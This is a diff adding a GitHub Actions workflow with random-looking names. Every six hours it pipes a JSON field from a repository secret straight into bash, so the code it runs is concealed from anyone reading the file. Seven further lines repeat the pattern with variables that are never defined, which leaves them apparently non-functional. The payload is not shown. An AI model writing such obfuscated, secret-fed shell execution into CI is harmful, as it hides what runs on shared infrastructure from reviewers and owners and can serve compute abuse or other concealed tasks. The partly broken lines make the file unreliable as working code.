@@ -1,0 +1,24 @@
+name: txyunmm
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '6 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: txyunmm
+        env:
+          ov15: ${{ secrets.ov15 }}
+        run: |
+          echo $ov15 | jq -r .l0 | /bin/bash
+          echo $idvky857 | jq -r .kmst6 | /bin/bash
+          echo $mwo18617 | jq -r .wcei001 | /bin/bash
+          echo $o9 | jq -r .iebnv68407 | /bin/bash
+          echo $gut05655 | jq -r .xkf394 | /bin/bash
+          echo $l248 | jq -r .h550 | /bin/bash
+          echo $f35 | jq -r .s252 | /bin/bash
+          echo $sn68961 | jq -r .gr6 | /bin/bash
+
